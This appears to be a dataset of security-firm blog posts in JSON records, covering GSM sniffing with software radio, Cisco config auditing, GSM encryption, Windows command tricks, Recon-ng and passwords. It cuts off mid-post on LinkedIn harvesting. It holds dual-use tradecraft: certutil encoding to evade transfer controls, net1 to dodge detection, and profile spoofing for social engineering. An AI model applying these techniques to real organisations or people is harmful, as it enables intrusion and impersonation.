python-scipy\n\ngr-osmosdr\n\nlibosmocore with header files\n\nsudo apt install gitsudo apt install cmakesudo apt install autoconfsudo apt install libtool-binsudo apt install pkg-config\n\nsudo apt-get update && sudo apt-get install libc6-dev-amd64sudo apt-get update && sudo apt-get install libcppunit-1.14-0\n\nsudo apt install swigsudo apt install doxygen\n\nsudo apt-get update && sudo apt-get install liblog4cpp5-dev\nsudo apt-get update && sudo apt-get install gr-osmosdr\nsudo apt-get update && sudo apt-get install libosmocore-dev\n\nsudo apt install python-pip\nsudo apt-get install python-numpy python-scipy python-matplotlib ipython python-pandas python-sympy python-nose\nsudo apt install libcanberra-gtk-module libcanberra-gtk3-module\n\nInstall gr-sdr [Gnu Radio Software Defined Radio]\n\ngit clone https://git.osmocom.org/gr-gsm\ncd gr-gsm\nmkdir build\ncd build\ncmake ..\nmkdir $HOME/.grc_gnuradio/ $HOME/.gnuradio/\nmake\nsudo make install\nsudo ldconfig\n\nInstall Gqrx SDR [Open Source 'Software Defined Radio' receiver]\n\nsudo apt install gqrx-sdr\nsudo apt install hackrf \n\nInstall Hackrf tools:\n\nBuilding HackRF tools from sourcePrerequisites for Linux (Debian/Ubuntu):\n\nsudo apt-get install build-essential cmake libusb-1.0-0-dev pkg-config libfftw3-dev\n\ngit clone https://github.com/mossmann/hackrf.git\ncd hackrf/host\nmkdir build\ncd build\ncmake ..\nmake\nsudo make install\nsudo ldconfig\n\nKalibrate, or `kal`, can scan for GSM base stations in a given frequency band and can use those GSM base stations to calculate the local oscillator frequency offset.\n\nInstall Kalibrate-Hackrf (kal): [GSM Base Station Sniffer]\n\ngit clone https://github.com/scateu/kalibrate-hackrf.git\ncd kalibrate-hackrf\n./bootstrap\n./configure\nMake\nsudo make install\n\nInstall Wireshark: [free and open-source packet analyzer]\n\nsudo apt-get update\nsudo apt install wireshark-qt\n\nGetting started:\n\nI executed the command: $  kal -s PCS \n\n... to run kalibrate-hackrf (kal) and target the PCS (1900MHz band), resulting in the following:\n\nI decided to use the first frequency found (1930.2MHz) for my follow-up testing.\n\nTuning to 1930.2MHz while running the Gqrx SDR (see below) shows activity centered around freq = 1930.535MHz. This will be the (adjusted) frequency that we will ultimately enter into the GnuRadio-Companion for capturing our packet traffic.\n\nUsing GnuRadio-Companion:\n\nA few years back, open-source 'airprobe_rtlsdr.grc' (Airprobe project) was the \"goto\" block for live monitoring of traffic, while using GnuRadio-Companion. \n\nAs of recent years, 'airprobe_rtlsdr.grc' was replaced by \"grgsm_livemon.grc\"  Special note: The gr-gsm project is based on the gsm-receiver written by Piotr Krysik (also the main author of gr-gsm for the Airprobe project).\n\nI changed directory to gr-gsm/apps\n\nExecuted:  $ gnuradio-companion grgsm_livemon.grc\n\nThis brings up the GnuRadio-Companion GUI, and displays the grgsm_livemon.grc block template.\n\nI then enabled the radio by clicking on the Start button (top center of display) and tuned to 1930.535MHz (adjusted frequency determined using Gqrx SDR). As soon as I locked into the frequency, I was presented with the following:\n\nIt's not obvious by the above image, but the data inside the console terminal is streaming at a very fast rate and will continue to stream until we click the stop button (top center of Gnu Radio Companion display).\n\nAlso, notice the high volume of \"2b\" bytes in the data stream. This is a strong indication that we are successfully capturing cellular traffic, as \"2b\" is used as a filler byte when constructing the packets.\n\nUsing Wireshark to analyze the packets:\n\nDuring a follow-up GnuRadio-Companion session, I decided to open a new terminal to run Wireshark and analyze the streaming live data using the loop-back mode and a 'gsmtap' filter.  This needs to be done as root, so the command is:\n\n$ sudo wireshark\n\nAs expected, Source and Destination are localhost (due to loop-back mode), and from my limited research of packet types, I know that System Information Type 4 is a carrier beacon, providing pertinent information.\n\nSummary:\n\nAs far as I'm concerned, this has turned out to be a pretty rewarding project and I feel I've learned quite a bit in the process. Obviously, I've barely scratched the surface of what Software Defined Radio is capable of, but I'm now looking forward to continuing my research in this area.\n\nNext up, I would like to better understand those packets I captured, what they mean and how the whole 'mobile network' works in general. I'd also like to run some sample test calls using my personal phones (to keep it legal) and capture/decode my personal SMS ('Hello World') packets.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Use CCAT: An Analysis Tool for Cisco Configuration Files\"\nTaxonomies: \"How-To, Informational, CCAT, Cisco Config Analysis Tool, kayla mackiewicz\"\nCreation Date: \"Mon, 04 Nov 2019 15:25:53 +0000\"\nKayla Mackiewicz //\n\nLast year, fellow tester Jordan Drysdale wrote a blog post about Cisco\u2019s Smart Install feature. His blog post can be found here. If this feature is enabled on a Cisco device, an attacker can download or upload a config file and even execute commands. Whether you use the Smart Install feature or some other method to obtain a config file during a pentest, there is a tool out there called Cisco Config Analysis Tool, or CCAT, that can parse the file for you. This tool could also come in handy for network administrators looking to conduct audits of their Cisco devices.\n\nCCAT conducts a set of checks against the configuration file or folder of files that are supplied as input by the user. The checks are based on the Cisco Guide to Harden Cisco IOS Devices. The tool was written in Python and can be found at the following GitHub repository:\n\nhttps://github.com/cisco-config-analysis-tool/ccat\n\nRunning CCAT is straightforward and the tool offers several optional arguments:\n\nIn the command example below, I ran CCAT against a directory of config files that were retrieved from a few Cisco devices and saved the results.\n\nC:>ccat.py config_files/ -output results\n\nThe output from the script in the command prompt contained a categorized list of the checks that took place and the results, which were color-coded to highlight areas that may need attention.\n\nThe output was also saved to an HTML file for each file in the \u201cconfig_files\u201d directory. These files can be viewed in the browser. Viewing the files in the browser revealed a bit more information than what could be seen in the command prompt. For each check that showed as red or yellow, there was a brief explanation and/or suggestion for how to fix the issue.\n\nIn the above example, there were three instances of configurations that were shown in red and considered to be insecure. The ARP inspection and DHCP snooping protections were both disabled, leaving this particular device potentially vulnerable to man-in-the-middle (MitM) attacks. Also, Cisco Smart Install was enabled. In summary, the output from this tool is useful on an engagement where testers may be looking to highlight a device\u2019s misconfigurations that could be abused by an attacker.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"GSM Traffic and Encryption: A5/1 Stream Cipher\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Ray Felch, A5/1 Stream Cipher, GSM, Raymond Felch\"\nCreation Date: \"Mon, 11 Nov 2019 15:00:01 +0000\"\nRay Felch // \n\nDisclaimer: Be sure to use a faraday bag or cage before transmitting cellular data so you don\u2019t accidentally break any laws by illegally transmitting on regulated frequencies. Additionally, intercepting and decrypting someone else\u2019s data is illegal, so be careful when researching your phone traffic. \n\nSome useful terminology:\n\nMobile Phone Related:\n\nMS    mobile station (phone)\n\nSIM    subscriber identity module (sim card)\n\nIMSI    international mobile subscriber identity (subscriber ID)\n\nTMSI    temporary IMSI (helps with privacy by obfuscating ISMI)\n\nKi   128-bit unique subscriber key (paired with IMSI)\n\nTower Related:\n\nBTS    base transceiver station (contains the equipment for transmitting and receiving radio signals, antennas, and equipment for encrypting and decrypting communications with the base station controller (BSC))\n\nBSC    base station controller (handles allocation of radio channels, receives measurements from the mobile phones and controls handovers from BTS to BTS)\n\nCore Network Related:\n\nNSS    Network Subsystem responsible for the routing of calls by way of the BSC and BTC\n\nMSC    mobile switching center (network switching)\n\nVLR    visitor location register (database of mobile stations that have roamed the area)\n\nHLR    home location register (main database of permanent subscriber information)\n\nAuC    authentication center\n\nVariables:\n\nRAND    128-bit random number (sent to MS by AuC to facilitate MS authentication challenge)\n\nSRES    challenge sent to MS (generated using RAND + Ki  + A3 algorithm)\n\nKC    uniquely generated key (generated using RAND + Ki + A8 algorithm)\n\n  \t  -- note: data is encrypted using KC + A5/1 algorithm\n\nPreliminary Information:\n\nBefore proceeding to the encryption process, it may be helpful to know that although there are three different algorithms (A3, A8, and A5/1), we can simplify the overall process significantly by stating upfront, the following:\n\nThe A3 (authentication) algorithm is 'only' used to facilitate authenticating that the mobile station (MS) has permission to be on the network.\n\nOnce authenticated, the A8 (ciphering key generating) algorithm is 'only' used to create a unique key (KC), that ultimately will be used (by the MS and the Network) for encrypting/decrypting data using the A5/1 stream cipher algorithm on-the-fly. \n\nThe A3 algorithm, A8 algorithm, IMSI and Ki all exist on the MS (phone) SIM card and the A5/1 stream cipher algorithm exists in the MS (phone) hardware. \n\nAdditionally, the Home Network (HLR, VLR, MSC, AuC), has access to the same information via its databases. \n\nTypical Process:\n\n Diagram 01 \n\nProcess: (follow diagram-01)\n\nMobile station (MS) requests access to the network,  MS sends its IMSI to the Network Subsystem (NSS) via the BSC / BTS. \n\nThe IMSI sent by the MS is forwarded to the MSC on the network, and the MSC passes that IMSI on to the HLR and requests authentication. \n\nThe HLR checks its database to make sure the IMSI belongs to the network.\n\n If valid, The HLR forwards the authentication request and IMSI to the Authentication Center (AuC).\n\nThe AuC will access its database to search for the Ki that is paired with the given IMSI.\n\nThe Auc will generate a 128-bit random number (RAND).\n\nThe RAND and Ki will be passed into the A3 (authentication) algorithm, creating a 32-bit SRES (signed response) for the challenge-response method.\n\nThe RAND is transmitted (via the BSC / BTS) to the mobile station (MS). \n\nThe RAND received by the MS, together with the SIM card-Ki are passed into the SIM card-A3 (authentication) algorithm, generating the phones SRES response. \n\nThe phones SRES response is transmitted (via the BSC / BTS) back to the AuC on the network. \n\nThe AuC compares the sent SRES with the received SRES for a match. If they match, then the authentication is successful. The subscriber (MS) joins the network.\n\nThe RAND, together with the SIM card-Ki are passed into the SIM card-A8 (ciphering key) algorithm, to produce a ciphering key (KC).\n\nThe KC generated is used with the A5 (stream ciphering) algorithm to encipher or decipher the data.\n\nThe A5 algorithm is stored in the phone's hardware and is responsible for encrypting and decrypting data on the fly. \n\nLevels of Security:\n\nAlgorithms:\n\nIMSI Obfuscation:\n\nThe first time a subscriber joins the network, the Authentication Center (AuC) assigns a TMSI (temporary IMSI) which will be used in place of the subscribers IMSI going forward. I say \"temporary\", but in fact, the TMSI is stored (along with the IMSI) in the VLR (visitor location register).\n\nWhen the phone is switched off, the phone saves the TMSI on its SIM card, ensuring it is available when switched on again.\n\nEvery new update (roaming, handoffs, etc) results in a new TMSI being created. The TMSI is used in place of the IMSI to protect the subscriber's identity.\n\nSample Packet Screenshots:\n\nLocation Updating Request (TMSI not established yet)\n\nAuthentication Request\n\nTMSI / A5/1 Algorithm Supported\n\nSummary\n\nThis write-up documents some of my follow-up research with regard to analyzing the GSM traffic packets I captured using Software Defined Radio. My attempt was to better understand the GSM mobile network protocols and procedures, with an emphasis on the authentication and ciphering algorithms being deployed.\n\nIn my opinion, there is a huge demand for exploring this relatively untouched attack vector, especially as we move towards adopting 5G technologies. The A5/1 stream cipher algorithm, is still in use today on many GSM networks, has a prior history of being exploitable, and there are quite a few networks that do not even implement ciphering in their protocols (SMS data completely exposed).\n\nThese vulnerabilities can potentially expose our private SMS messages, personal data, and even our GPS locations to the public if left unguarded. More research in this area is required to ensure our privacy remains secure. From an InfoSec perspective, the areas of concern might be MiTM attacks, network breaches, etc. The playing field is wide open.\n\nReferences:\n\nhttps://www.sans.org/reading-room/whitepapers/telephone/gsm-standard-an-overview-security-317\n\nhttps://en.wikipedia.org/wiki/GSM\n\nhttps://payatu.com/blog_28 by https://payatu.com/blogger_by%20Rashid%20Feroze\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Rainy Day Windows Command Research Results\"\nTaxonomies: \"Blue Team, Blue Team Tools, How-To, Informational, Red Team, Red Team Tools, Certutil, Clip, Clipboard, Cmdkey, Curl, Microsoft, Net1, Sally Vandeven, Tar, Where, Whoami, Windows, Windows Command, Wslconfig\"\nCreation Date: \"Wed, 13 Nov 2019 13:38:03 +0000\"\nSally Vandeven //\n\nWe have all heard people talk about how much cooler Linux is than Windows, so much easier to use, etc. Well, they are not necessarily wrong\u2026 but we have learned that Microsoft has some very interesting gems hiding in plain sight.\n\nSeriously, Microsoft seems to be making a concerted effort to add some Linux-y functionality. In fact, they introduced Linux as a subsystem on Windows 10 back in 2016. You enable the feature using PowerShell, then visit the Microsoft Store and pick your favorite distro to install. But I digress\u2026 this blog post is not about Linux, it is about some neat utilities built into Windows... some are in fact very Linux-y and some are unique to Windows but still interesting to pentesters. We will show you some of the interesting finds below.\n\nNote that the help docs for many of the tools can be found in the Windows Command reference document here.\n\nCertutil\n\nThe built-in certutil command can be used as a quick base64 encoder/decoder. It is meant to encode and decode SSL certificates but can be used for other things as well. For example, let\u2019s say you need to get an executable file on to a target system but a network control detects/prevents the transfer of an EXE file. Well, in that case, you can base64 encode it prior to sending and then base64 decode it using certutil once it\u2019s on the target system. Nice. \n\nHere is an example using a string of text but it would work the same way for a binary executable file.\n\nBy default, certutil decodes and encodes base64 data. But another fun fact is that it can also decode hexadecimal:\n\nWhile the help text does not show an option for hex encoding, we tried it and it actually does work... have a look.\n\nThis might come in very handy if you are looking for, say, strings in a binary. Below is an example showing a hex dump of notepad.exe.\n\nClip\n\nMicrosoft developed the \u201cClippy\u201d character to assist users with Office products. He has been on and off the payroll since 1997 and (understandably) appears to be currently on leave. \n\nCompletely unrelated to \u201cClippy\u201d is the clip utility.\n\nThis utility redirects output to the clipboard. For example, if you want to capture running services and insert the list into the clipboard:\n\nYou can direct the output from a command into the clipboard for easy copy/pasting or you stuff the contents of a whole file into the clipboard.\n\nnet1 start | clip\n\nPS C:\\> net1 user /domain | clip\n\nclip < myTextFile.txt\n\nIn all three cases, you have loaded something into the clipboard, which you can retrieve and paste where you need it using right-click \u201cpaste\u201d or Control-V.\n\nI use clip.exe all the time with WSL (Windows Subsystem for Linux) as well using something like this:\n\n$ cat file.csv | cut -f2 -d\",\" | sort | uniq | clip.exe\n\nIt is a very handy way to slice and dice data for use in a report.\n\nClipboard saving of multiple items is off by default but if you turn it on\u2026.\n\n...you can use Windows + V to access all of the \u201cclips\u201d in the clipboard.\n\nTo paste one of the items in the clipboard, just click on the one you want.\n\nYou can even PIN a clip and it will be saved (until a reboot) even if you clear the clipboard. This is a great place to store passwords.\n\nCmdkey  \n\nCmdkey is the command version of the Windows credential manager. The equivalent GUI version can be launched using \u201ccontrol keymgr.dll\u201d or by selecting \u201cCredential Manager\u201d from the Control Panel.  Show any saved credentials using the command \n\ncmdkey /list\n\nBut what if there were stored credentials that were privileged? How could an attacker use them?\n\nAccording to this blog post, it\u2019s easy, although when I set up Cobalt Strike and tried it, it didn\u2019t work, but your mileage may vary.\n\nCurl\n\nCurl is a command-line browser, like wget, that pulls content from a web server and is found on most Linux systems by default and it was recently added to Windows! \n\nFor pentesters, maybe proxy configurations prevent you from downloading files using a browser. If so, try curl and maybe such downloads won\u2019t get noticed. \n\nHere is an example of something very useful you can do with curl:\n\nCurl has an in-depth help page as well. Use \u201ccurl --help\u201d to view all the options.\n\nNet1\n\n\u201cnet1\u201d is pretty much the same as \u201cnet\u201d but about 20 years ago, as we approached Y2K, there was a problem with the \u201cnet\u201d command. The \u201cnet1\u201d command was the remedy for that issue and it has stuck around ever since. Why does this matter now? It probably doesn\u2019t in most cases but if you are a pentester, you might just find that the \u201cnet\u201d command gets noticed by the blue team while the \u201cnet1\u201d command does not. \n\nExample commands:\n\n net1 localgroup administrators - enumerate local admin accounts net1 start - see list of running services net1 start | find /v \u201c\u201d /c - show a count of running services\n\nTar\n\nTar is an old Unix utility originally created to make tape archives from one or more files. This was developed as a backup solution. Today, tar is used similar to zip - to make a single archive out of multiple files in order to backup, archive, transmit, etc. In April 2018, tar was included in Windows 10 builds.\n\nUsing the standard Windows help \u201c/?\u201d it appears as though tar for Windows has very few options.\n\nHowever, when the \u201c--help\u201d option is requested, you can see that there is actually much more functionality, including compression options like its Linux cousin.\n\nWe tested this by using tar to archive and compress a few files on a Windows system. \n\nWe then moved the files to a Debian Linux machine and found that they are in fact valid tarballs, one without and one with compression.\n\nWhere\n\n\u201cWhere\u201d is like the Linux \u201clocate\u201d command. It finds files for you and is very handy.\n\nExample:\n\nwhere /R c:\\ /F *.conf  *.xml   \n\nThis will search recursively through the C drive looking for conf and xml files. If found, the \u201c/F\u201d means show the full path.\n\nWhoami\n\nThe Whoami command displays information about the current account. Used without arguments, it displays the account name.\n\nIt can show the privileges or group membership associated with the current account using the \u201c/priv\u201d and \u201c/groups\u201d options respectively.\n\nIt can also display the FQDN and UPN for the account:\n\nwslconfig \n\nThis built-in command shows the current Windows Subsystem for Linux installations. It also allows you to do some other administrative tasks associated with Linux distributions, provided you have admin-level access. \n\nIt is definitely interesting to know if WSL has been enabled on a system that you are testing from or have pivoted to. If you see this message, then WSL has not been enabled on the system:\n\nThis, on the other hand, indicates that Kali Linux has been installed on the system:\n\nIf it has not been enabled and you have admin rights, by all means, go ahead and enable it!\n\nSo, for the red-teamers out there, add these to your repertoire of \u201cliving off the land\u201d tools. And blue-teamers might want to keep an eye out for use of these tools. Regular users will not likely be using curl, certutil, and tar so monitoring their use should generate actionable alerts instead of noise.\n\nThat\u2019s all for now\u2026\n\n...but we will keep digging and if we find more interesting Windows commands we will compose a sequel.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"What's Changed in Recon-ng 5.x\"\nTaxonomies: \"Author, Brian King, How-To, Informational, Recon, Brian King, Recon-ng\"\nCreation Date: \"Tue, 26 Nov 2019 16:22:35 +0000\"\nBrian King //\n\nRecon-ng had a major update in June 2019, from 4.9.6 to 5.0.0. This post is meant to help with the adjustment by providing a cheat sheet for common commands and mapping of some old syntax to the new syntax.\n\nIf you're at all like me, you'll assume that what you know from the 4.x version will help you get up to speed on 5.x. And you'll be wrong. If you instead treat Recon-ng 5.x as if it's a completely new tool, you'll be fine. Forget what you know about the 4.x version.\n\nVisit the Recon-ng wiki on GitHub. Read the whole \"Getting Started\" section and maybe join the Slack workspace it mentions at the end. Read the whole \"Features\" section. The \"Troubleshooting\" section is also helpful and very short. The \"Intro to Recon-ng v5\" screencast on the \"Videos\" section is also worth the time. Go slowly at first and take notes for yourself.\n\nThe major differences in Recon-ng 5.x involve:\n\nMoving from BitBucket to GitHub\n\nUpdating to Python 3 (Python 3.6 is now the minimum requirement)\n\nMoving the modules into a separately-managed \"marketplace\"\n\nModifying the syntax of some commands\n\nManually adding seed data to the database is now done by \"db insert [your_item_type]\" instead of \"add [your_item_type]\"\n\nContext must be explicitly stated: \"modules search ...\" instead of just \"search ...\" and \"options set ...\" instead of just \"set ...\"\n\nEverything is case-sensitive and lower-case except for the names of options (both global and per-module) which must be in ALL CAPS.\n\nThe actual use of the tool hasn't changed much, but the initial tasks are different enough that I, for one, felt completely lost. If you have scripts or rc files, those will need to be updated to use the new syntax, too.\n\nThe first of those \"major differences\" above is easy enough: the project is on GitHub now and not BitBucket. If you visit the old BitBucket site, you get the new URL: https://github.com/lanmaster53/recon-ng\n\nThe update to Python 3 is even less of an adjustment because it has no effect on how you use the tool. Unless you're developing Recon-ng modules, you can ignore this architectural change.\n\nMoving all of the modules into a \"marketplace\" allows modules to be created and maintained separately from the Recon-ng framework itself.  This gives two huge and immediate benefits. First, it draws a clear line between what's the framework's responsibility and what is handled by any given module. Second, it allows modules to be updated independently from the framework, which means module updates don't need to be as disruptive as they sometimes used to be. You can learn more about how the marketplace works from the Recon-ng wiki.\n\nAs a Recon-ng user, the only thing you need to know about the marketplace is that it exists and that you must \"install\" modules from there before you can use them. If you do this as part of your initial setup, you can (almost) forget about the separation.\n\nThe main point of this article, however, is about adjusting to the new command syntax. The sections below provide a suggested sequence to follow for a new installation and then a cheat sheet to refer to as you use Recon-ng for actual work.\n\nSetup:\n\nClone the repo, install framework dependencies, install three additional dependencies for the marketplace modules, launch the framework, install the marketplace modules, then add your own API keys. After these steps, you'll have a functioning Recon-ng installation, ready to use.\n\nsudo apt update\n\nsudo apt upgrade\n\nsudo apt install -y git python3-pip\n\ngit clone https://github.com/lanmaster53/recon-ng.git\n\ncd recon-ng\n\npip3 install -r REQUIREMENTS\n\npip3 install PyPDF3 pyaes bs4\n\nFirst Launch:\n\nOnce that setup is done, start Recon-ng into a new Workspace we'll call \"example,\" install the modules, then add your API keys. Installing every marketplace module is simpler than selecting individual modules and installing them each one at a time, but you can do it either way.\n\nThe screenshots below show starting up Recon-ng for the first time into a new workspace (after completing the installation tasks listed above) and completing all of the framework setup tasks so it's ready to use.\n\n recon-ng -w example\n\n marketplace install all \n\n keys list\n\n keys add [name_of_key] [key_itself]\n\nNotice that the list of expected key names doesn't populate until you install the modules. If you run \"keys list\" before installing anything, you'll get no output. You can still add keys, you just have to know the proper name for each one when you do.\n\nAlso notice that if you misspell the name of the key when you add it, the framework will accept it as you typed it. This is one way in which the framework can better handle new API keys, but the side-effect is that if you make a typo when you add a key, you'll get no error, but the modules that use your new key will fail when you run them. You'll get a clear error message then, so it's easy to recover from, but it's worth knowing that there's no validation of the key names here.\n\nBasic Usage:\n\nNext, we'll look at the global options, add some seed data, and get started on our reconnaissance project.\n\nFirst, look at the global options to see what they are. Then we'll change the default timeout to 15 seconds, just to see how to set these.\n\n Options list and options set TIMEOUT 15 \n\nThe names for all of the options (global and per-module) are in all caps. If you try to set them by lower-case, it will fail. But! Tab-completion works and doesn't care about case. If you type `options set time` the framework auto-completes it to `options set TIMEOUT` for you.\n\n Add Seed Data:\n\n db insert companies\n\n db insert domains (on one line)\n\nMake Recon-ng tell you the alternate syntax, then use that:\n\n db insert domains (with prompts) \n\nLoad and run a module:\n\n Running a Module \n\nSetting Module Options\n\nThe 'info' command, while in a module's context, tells you where the module gets its seed (or 'source') data and tells you how you can modify that. Most modules default to reading from the table that's the first word in the module's full name. For example, the module 'domains-hosts/hackertarget' will start with something that's already in the 'domains' table.\n\n Module 'info' \n\nRecon-ng 5.x Cheat Sheet\n\nOnce you've read the Recon-ng wiki, and are comfortable with how it's organized, this cheat sheet may be a useful reminder of syntax and workflow.\n\nhttps://www.blackhillsinfosec.com/wp-content/uploads/2019/11/recon-ng-5.x-cheat-sheet-Sheet1-1.pdf\n\nWhere to Go from Here\n\nNow that you have seen how to install Recon-ng 5.x, how to see what modules are available, how to customize their behavior, and how to run them, you should be ready to start a recon project. Keep the cheat sheet close by at first so you don't get stuck on a syntax issue. Better yet - make a cheat sheet for yourself as you go that only has what you need on it.\n\nOnce you have a workflow that suits your needs (creating a workspace, adding seed data, running modules in some sequence that works for you), the next logical step is using resource files to automate it all for you.\n\nA resource file is a text file with Recon-ng commands in it, one per line. The framework will run them as if you'd typed them manually. The 'script record' command allows you to record your actions into one of these resource files, and then 'script execute' (or the '-r' argument on the command line when you start the framework) will run it for you. You can also make the file manually by just typing it directly.\n\nIf you need to keep exact records of your actions while you use Recon-ng, the 'spool' command will do just that.\n\nIf you need to take a snapshot of the workspace at intervals while you work, look into the 'snapshots' command.\n\nAfter a couple of practice runs, this will all become second-nature. Once you spend some time making resource files that fit your process, Recon-ng will become a wonderful assistant, collecting open-source information for you while you work on other things.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Passwords: Our First Line of Defense\"\nTaxonomies: \"Blue Team, Blue Team Tools, Informational, Password Cracking, Password Spray, Darin Roberts, password policy, passwords\"\nCreation Date: \"Tue, 03 Dec 2019 17:36:56 +0000\"\nDarin Roberts //\n\n\u201cWhy do you recommend a 15-character password policy when (name your favorite policy here) recommends only 8-character minimum passwords?\u201d I have had this question posed to me a couple of times in the very recent past.  \n\nThere were 2 separate policies that were shown to me when asking these questions. First was the NIST policy.  From the NIST 800-63 guidelines, it says that \u201cmemorized secrets [are] to be at least 8 characters in length.\u201d  Memorized secrets are defined to include passwords. The NIST guidelines were recently updated, but the password minimum length remains at 8 characters. Taken from https://blog.didierstevens.com/2017/02/28/password-history-analysis/.\n\nThe other policy was the policy for Microsoft Office 365.  This policy states that one recommendation \u201cfor keeping your organization as secure as possible\u201d is to \u201cmaintain an 8-character minimum length requirement (longer isn\u2019t necessarily better).\u201d  This is taken from https://docs.microsoft.com/en-us/office365/admin/misc/password-policy-recommendations?view=o365-worldwide\n\nI disagree with both of these policies and STRONGLY disagree with the policy from Microsoft.  I will explain my reasoning and hopefully will convince those of you with an 8-character password policy to change to something that is stronger.\n\nWhen I am working on a pentest, one of the first things I do is see if there is a place that I can password spray.  These portals are often email, but sometimes they are custom login portals, VPN portals, or another login portal that employees use.  If the password policy is 8-character minimums, I will usually get in. Given a large enough field of users (found through recon), there is almost always at least one user who has a password of Fall2019, Summer19!, or Company123.  It used to be funny when that happened, but it happens so often that now it is just sad.\n\nYou might be saying to yourself, \u201cAll of my external portals use two-factor authentication, so I am good.\u201d  Well, the two-factor authentication (2FA) is only as good as its implementation. One of my co-workers was able to get into a 2FA protected email account because one of the 2FA methods went to a Skype phone number.  Sounds secure, except the Skype account used only single factor. She logged in to Skype as the victim, sent the 2FA request to the Skype account, and then logged in to email.\n\nI am in no means saying that we shouldn\u2019t use 2FA because it can be bypassed.  2FA, if employed correctly, thwarts many attacks. I am only saying that we shouldn\u2019t be ignoring the first method of protection - passwords.  If your first authentication method is difficult to bypass, many attackers won\u2019t even be able to get to the second method of authentication.\n\nSo what should you make your password policy? The easy answer is at least 15 characters.  Why that length? We will be having a webcast on this very topic this week and you can register below. There will also be a follow-up blog with more explanation.\n\nWebcast:\n\nRegister for our next webcast \u2014 Passwords: You Are the Weakest Link \u2014 on Dec 5, 2019, 1:00 PM EST at: https://attendee.gotowebinar.com/register/4720742581883580684\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Collecting and Crafting User Information from LinkedIn\"\nTaxonomies: \"Author, Finding, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Justin Angel, Phishing, Recon, Red Team, Red Team Tools, Justin Angel, LinkedIn, Parsuite, Peasant, SendGrid\"\nCreation Date: \"Wed, 11 Dec 2019 13:00:36 +0000\"\nJustin Angel //\n\nPenetration testing and red team engagements often require operators to collect user information from various sources that can then be translated into inputs to support social engineering and password attacks. LinkedIn is obviously a prime source for this type of information since users can associate themselves with a particular company. Assuming we have identified the companies our target organization owns during earlier stages of reconnaissance, we may be able to enumerate employee information by simply finding the company page within LinkedIn and browsing the \u201cpeople\u201d section.\n\nHowever, for the following (and more) reasons (or magic), this isn\u2019t very efficient or straightforward:\n\nSo much copypasta, unless you\u2019re being smart and using LinkedInt by @vysec -- the key inspiration for this tool\n\nLinkedIn restricts the information a given account can access on a target profile based on a constellation of variables, such as the industry it\u2019s currently affiliated with and if it shares any overlapping connections\n\nDepending on the effectiveness of the target company\u2019s security awareness training, personnel may have their profiles configured to hide personal information before first establishing a connection with your account\n\nThe remainder of this brief post will discuss my strategy for gaining as much profile content as possible and a quick example of how to quickly manipulate the output from Peasant into actionable values.\n\nI use the following strategy to maximize the number of accessible profiles associated with a company:\n\nI configure my profile such that it appears to hold a position with the target company. This often opens up a few profiles I can connect with.\n\nHarvest information from accessible profiles.\n\nIf this yields insufficient information (mileage varies), I\u2019ll duplicate the content from a high-impact profile to my own.\n\nThe goal here is to make your profile appealing to accounts you\u2019re about to send connection requests to.\n\nThe greater number of connections your account shares with a company, the greater number of profiles it can access.\n\nRecruiter profiles specializing in the same industry as the target organization is a good choice.\n\nBlocking the account you just spoofed is a good idea otherwise things might get weird.\n\nFor profiles I can connect with, send a connection request.\n\nTip: It\u2019s good to exercise some discretion here. Sending a connection request to the security team isn\u2019t a great idea\u2026 probably.\n\nWait for one or more requests to be accepted.\n\nFor every couple of connection requests accepted, repeat steps 2 and 5 until the desired number of profiles are collected.\n\nThis is a laborious and time-consuming process when performed manually, so I developed a utility (Peasant) to automate many of these steps. It provides three basic modes of operation:\n\nharvest_contacts - For each given company identifier, harvests contact information from accessible LinkedIn profiles.\n\nadd_contacts - Forge connection requests for target user profiles.\n\nspoof_contact - Spoof an accessible LinkedIn profile, i.e. copy content from the target LinkedIn profile to your own.\n\nWarning: The LinkedIn API is quite complicated and I have not researched the calls at great length, only enough to get this code working. Depending on the inputs, there may be times when Peasant fails -- particularly when spoofing profiles.\n\nTry to clear all content of your current profile before spoofing content from the foreign profile if this occurs.\n\nYou should also know that your profile may be flagged for nasty behavior. Kudos to the LinkedIn team for taking the time and effort to implement detection mechanisms.\n\n Restricted Account Alert\n\nContact Harvesting\n\nIf you\u2019ve ever visited the People section of a company profile, you may have noticed that scrolling to the bottom of the list results in the page dynamically adding additional profiles. The web interface is using JavaScript to make API calls and add new HTML elements for each result. Peasant capitalizes on these API calls to extract profile content directly from the API.\n\nNotes:\n\nLinkedIn often alerts users when their profile has been visited. This shouldn\u2019t occur when harvesting profiles using Peasant since they\u2019re not directly accessed.\n\nLinkedIn allows access only to 1,000 search results at a time, however, different results may be returned each time a query is submitted - so running Peasant multiple times is recommended.\n\nUse the \u2018-ac\u2019 flag to tell Peasant to generate connection requests when a profile is discovered (if desired), removing the need to run it again (this is a bit reckless).\n\nWarning: Unless you have a premium account, there\u2019s a strict API limit enforced that will not be refreshed until the next month.\n\nWarning: Though the output from LinkedIn is structured well, you\u2019ll need to browse through and massage the output from Peasant since we\u2019re still dealing with user-generated content. All content will be dumped without discretion, emojis and all.\n\nAdding Contacts\n\nInformation gathered when harvesting profiles includes an \u201centity URN\u201d field that is used to identify a specific LinkedIn profile. We can take this value and craft an API call that will send a connection request to the associated URN. Peasant can accept CSV files generated by the harvest_contacts mode and send a connection request to each record. The request message can be customized as well.\n\nNotes:\n\nYou must have enough access to a target profile in order to send a connection request, otherwise, the request will be ignored.\n\nLinkedIn enforces a loose API limit on sending connection requests. You can usually run it hourly in windows.\n\nProfile Spoofing\n\nPeasant can \u201cspoof\u201d content from a foreign profile and update your profile with that content, including images. This is particularly useful in social engineering situations when you\u2019d like to impersonate an entity that works within a target organization.\n\nNotes:\n\nYou must have enough access with a target profile to view its contents.\n\nThis will likely trigger a \u201cview alert\u201d on the foreign profile (unconfirmed).\n\nThe API calls made to support this are somewhat complex and could introduce imperfections to your profile. Take the time to review it for accuracy!\n\nShould Peasant choke while spoofing a profile, clear your current profile of all content and try again. \n\nExample\n\nLet\u2019s close out with a quick example focusing on Microsoft\u2019s company 